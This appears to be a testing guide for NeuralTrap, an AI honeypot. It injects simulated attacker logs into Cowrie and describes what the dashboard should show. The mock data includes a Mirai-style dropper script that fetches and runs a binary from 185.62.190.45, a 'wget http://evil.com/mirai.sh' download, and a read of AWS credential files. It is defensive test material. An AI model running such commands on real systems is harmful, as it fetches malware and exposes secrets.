# NeuralTrap — Master Feature Testing Guide

> **Project**: NeuralTrap — AI-Powered Honeypot Deception Network  
> **Purpose**: This guide is designed to test **EVERY newly added and existing feature** in a single, cohesive end-to-end simulation.

---

## The Master End-to-End Simulation

This master script will simulate a highly advanced attacker interacting with your honeypot. It will simultaneously test:
1. Log Ingestion & Real-time Processing
2. LLM Cybersecurity Classification
3. **Dynamic Honeytoken Triggers**
4. **Automated Malware Analysis**
5. **MITRE ATT&CK Mapping**
6. Auto-Firewall Blocking
7. Forensic Report Generation

### Step 1: Prepare the Environment
We must create the honeytokens and a mock malware payload so NeuralTrap has data to analyze when the simulation runs.

Run this in your Cowrie environment:
```bash
# 1. Generate the honeytokens
python3 generate_honeytokens.py

# 2. Create the dummy malware payload that the attacker will "download"
mkdir -p ~/cowrie/var/lib/cowrie/downloads/
echo -e '#!/bin/bash\nwget http://185.62.190.45/bins/mirai.x86 -O dvrHelper\nchmod 777 dvrHelper\n./dvrHelper' > ~/cowrie/var/lib/cowrie/downloads/simulated-malware-hash
```

### Step 2: Start NeuralTrap
Open a terminal and start the engine so it listens for the logs:
```bash
python3 neuraltrap.py
# Leave this running!
```

### Step 3: Inject the Master Simulation
Open a **second terminal** and paste the following bash script. It writes perfectly formatted JSON logs directly into Cowrie's log file.

> [!CAUTION]
> **Change the `SID` every time you run this!** NeuralTrap ignores logs it has already processed. If you run this twice with `SID="MASTER-001"`, the second run will be ignored. Change it to `MASTER-002`, `MASTER-003`, etc.

```bash
#!/bin/bash
# === CHANGE THIS EVERY RUN ===
SID="MASTER-001"
# ==============================

LOG=~/cowrie/var/log/cowrie/cowrie.json
IP="10.99.99.99"

echo "Injecting Master Simulation: $SID"

# 1. Connect & Client Version
echo "{\"eventid\":\"cowrie.session.connect\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"timestamp\":\"2026-05-15T12:00:00Z\"}" >> $LOG
echo "{\"eventid\":\"cowrie.client.version\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"version\":\"SSH-2.0-OpenSSH_8.9\",\"timestamp\":\"2026-05-15T12:00:01Z\"}" >> $LOG

# 2. Authentication (Fail then Success)
echo "{\"eventid\":\"cowrie.login.failed\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"username\":\"root\",\"password\":\"admin123\",\"timestamp\":\"2026-05-15T12:00:03Z\"}" >> $LOG
echo "{\"eventid\":\"cowrie.login.success\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"username\":\"root\",\"password\":\"toor\",\"timestamp\":\"2026-05-15T12:00:04Z\"}" >> $LOG

# 3. Reconnaissance Commands
echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"whoami\",\"timestamp\":\"2026-05-15T12:00:10Z\"}" >> $LOG
sleep 1
echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"uname -a\",\"timestamp\":\"2026-05-15T12:00:12Z\"}" >> $LOG
sleep 1

# 4. Honeytoken Trigger (AWS Credentials)
echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"cat root/.aws/credentials\",\"timestamp\":\"2026-05-15T12:00:15Z\"}" >> $LOG
sleep 1

# 5. Malware Download
echo "{\"eventid\":\"cowrie.command.input\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"input\":\"wget http://evil.com/mirai.sh\",\"timestamp\":\"2026-05-15T12:00:20Z\"}" >> $LOG
sleep 1
# Simulate the actual file transfer event fired by Cowrie
echo "{\"eventid\":\"cowrie.session.file_download\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"url\":\"http://evil.com/mirai.sh\",\"outfile\":\"/tmp/mirai.sh\",\"shasum\":\"simulated-malware-hash\",\"timestamp\":\"2026-05-15T12:00:22Z\"}" >> $LOG
sleep 1

# 6. Disconnect
echo "{\"eventid\":\"cowrie.session.closed\",\"session\":\"$SID\",\"src_ip\":\"$IP\",\"duration\":25.0,\"timestamp\":\"2026-05-15T12:00:25Z\"}" >> $LOG

echo "Injection Complete!"
```

### Step 4: Watch NeuralTrap React
In the terminal running `neuraltrap.py`, you should see it light up:
- `🔌 New connection...`
- `✅ login OK...`
- `🍯 HONEYTOKEN TRIGGERED: AWS Credentials via 'cat root/.aws/credentials'`
- `🚨 HIGH THREAT DETECTED — Honeytoken Triggered`
- `🚨 BLOCKED: 10.99.99.99`
- `⬇️ download http://evil.com/mirai.sh`
- `🦠 Analyzing malware payload: simulated-malware-hash from http://evil.com/mirai.sh`
- `✅ Malware analysis complete...`
- `📋 Report generated...`

---

## Verify Everything in the Dashboard

Now, open the dashboard to see all features visually represented:

```bash
streamlit run dashboard.py --server.port 8501
# Open http://localhost:8501
```

| Feature | Dashboard Tab | What to check for |
|---------|--------------|------------------|
| **Core Threat Metrics** | **🏠 Overview** | "Total Sessions", "High Threat Sessions", and "IPs Blocked" counts should increment. Recent Attack Sessions table shows `MASTER-001`. |
| **Live Command Parsing** | **⚔️ Live Attacks** | You should see `whoami`, `uname -a`, `cat root/.aws/credentials`, and `wget` listed here. |
| **Cowrie Intel Parsing** | **🔬 Cowrie Intel** | Check the "Recent file uploads & downloads" table for the `simulated-malware-hash` entry. |
| **LLM Classification** | **🧠 AI Predictions** | Session `MASTER-001` is shown with a 🔴 100% Threat Score (because it triggered a honeytoken). |
| **AI Forensic Reports** | **📋 Forensic Reports** | Expand the report for `MASTER-001`. Read the LLM's plain-English narrative of the attack. |
| **Auto-Firewall** | **🚫 Blocked IPs** | IP `10.99.99.99` should be listed with Reason "Auto-blocked by NeuralTrap". |
| **MITRE ATT&CK** | **📈 Live Threat Monitor** | Scroll down to the MITRE heatmap. You should see tactics like `TA0006 Credential Access` or `TA0011 Command and Control` dynamically extracted. |
| **Malware Analyzer** | **🦠 Malware Intelligence** | Look for `simulated-malware-hash`. Read the AI Analysis Report (it should mention "Mirai" based on our mock payload) and verify extracted IOCs (`185.62.190.45`). |
